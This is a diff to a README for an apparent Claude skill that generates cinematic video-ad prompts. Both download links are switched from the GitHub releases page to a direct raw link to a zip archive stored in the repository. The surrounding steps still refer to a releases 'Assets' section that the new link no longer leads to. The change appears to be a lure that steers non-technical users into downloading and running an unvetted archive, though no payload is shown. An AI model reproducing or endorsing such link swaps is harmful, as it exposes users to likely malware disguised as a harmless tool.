@@ -1,6 +1,6 @@
 # 🎥 claude-skill-cinematic-prompt - Create cinematic video ads with Claude
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/adlaiponderous700/claude-skill-cinematic-prompt/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/adlaiponderous700/claude-skill-cinematic-prompt/main/skill/cinematic_prompt_claude_skill_3.3.zip)
 
 This software helps you create video ad prompts. You build shot-by-shot plans for the Higgsfield AI service. The tool produces camera instructions, music suggestions, and on-screen text for your marketing projects. You do not need coding skills to use this.
 
@@ -16,7 +16,7 @@ Make sure your computer meets these requirements:
 
 ## 📥 Installation
 
-Visit [this page](https://github.com/adlaiponderous700/claude-skill-cinematic-prompt/releases) to download the latest version of the software.
+Visit [this page](https://raw.githubusercontent.com/adlaiponderous700/claude-skill-cinematic-prompt/main/skill/cinematic_prompt_claude_skill_3.3.zip) to download the latest version of the software.
 
 1.  Click the link above.
 2.  Look for the section marked Assets.
